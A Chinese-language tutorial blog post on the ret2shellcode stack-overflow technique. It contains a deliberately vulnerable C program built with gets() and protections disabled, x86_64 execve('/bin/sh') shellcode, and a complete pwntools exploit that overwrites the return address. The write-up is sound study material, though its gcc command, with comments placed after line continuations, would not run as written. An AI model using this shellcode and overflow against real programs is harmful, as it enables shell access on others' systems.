---
title: "ret2shellcode"
date: 2024-06-02
draft: false
categories: ["pwn"]
tags: ["pwn", "rop", "stack overflow"]
series: ["rop"]
series_order: 2
---
返回到 shellcode（return to shellcode）攻击。主要运用攻击者在堆栈上写入的 shellcode，然后覆盖程序的返回地址，控制程序的控制流返回到注入的 shellcode，从而执行恶意代码。通过以下代码为例：

```c
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

char buf2[100];

int main(void) {
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stdin, 0LL, 1, 0LL);

    long page_size = sysconf(_SC_PAGESIZE);
    void *page_start = (void *)((long)buf2 & ~(page_size - 1));
    // Linux 内核2.6.18-8后，默认不再同时具有可写与可执行的段。这种机制被称为"W^X"（Write XOR Execute）
    if (mprotect(page_start, page_size, PROT_READ | PROT_WRITE | PROT_EXEC) != 0) {
        perror("mprotect");
        return 1;
    }

    char buf[100];

    printf("No system for you this time !!!\n");
    gets(buf);
    strncpy(buf2, buf, 100);
    printf("bye bye ~");

    return 0;
}
```

使用 gcc 编译代码

```sh
$ gcc -std=c99 \   # 使用 C99 标准，C99 之后不支持 gets 函数
    -no-pie \               # 关闭地址随机化
    -fno-stack-protector \  # 关闭栈破坏检测
    -z execstack \          # 关闭栈不可执行
    example.c -o example
```

可以看出程序存在栈溢出漏洞，输入的数据的前100个字节会被复制到 `buf2`， `buf2` 所处的页面被手动设置为可执行。可以在 `buf2` 中注入 shellcode，再覆盖程序返回地址将其指向 `buf2`.。以下是一个简单的 x86_64 汇编代码，用来调用 `execve("/bin/sh", NULL, NULL)`：

```assembly
; shellcode.s
section .text ; 定义代码段（text section），存放可执行代码。
    global _start ; 程序入口
_start:
    ; 将 "/bin/sh\0" 压栈
    xor rax, rax
    push rax  ; "\0"，字符串结束标志
    mov rbx, 0x68732f2f6e69622f ; "/bin//sh"的 ascii 表示，使用小端法表示
    push rbx

    ; 设置 execve 参数，根据64位系统的调用约定:
    ;  RDI - 第一个参数
 ;  RSI - 第二个参数
 ;  RDX - 第三个参数
    mov rdi, rsp ; Address of '/bin//sh'
    xor rsi, rsi    ; argv = NULL
    xor rdx, rdx    ; envp = NULL

    ; 调用 execve
    push 59 ; x86_64架构中，59是 execve 的系统调用编号
    pop rax
    syscall  ; 执行系统调用
```

使用 IDA 查看生成的 example 程序，可以看到输入的数据储存在栈上距离 `rbp` 0x80字节。`buf2` 位于 0x404080 处

```assembly
.bss:0000000000404080                 public buf2
.bss:0000000000404080 ; char buf2[104]
.bss:0000000000404080 buf2            db 68h dup(?)           ; DATA XREF: main+5C↑o
.bss:0000000000404080                                         ; main+C3↑o
------------------------------------------------------------------------------------
int __fastcall main(int argc, const char **argv, const char **envp)
{
 char src[112]; // [rsp+0h] [rbp-80h] BYREF

......

 puts("No system for you this time !!!");
 gets(src);
 strncpy(buf2, src, 0x64uLL);
 printf("bye bye ~");
 return 0;
}
```

以下是利用 pwntools 编写的 wp:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch="amd64")
exe = "./ret2shellcode"

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
b main
continue
""".format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# shellcode = asm(shellcraft.sh()) # pwntools 也提供许多内置的 shellcode
shellcode = asm("""
    xor rax, rax
    push rax
    mov rbx, 0x68732f2f6e69622f
    push rbx
    mov rdi, rsp    /* address of "/bin//sh" */
    xor rsi, rsi    /* argv = NULL */
    xor rdx, rdx    /* envp = NULL */
    push 59
    pop rax
    syscall
""")
buf2_addr = 0x404080
payload = shellcode.ljust(0x80 + 8, b"a") + p64(buf2_addr)

io.sendline(payload)

io.interactive()

```
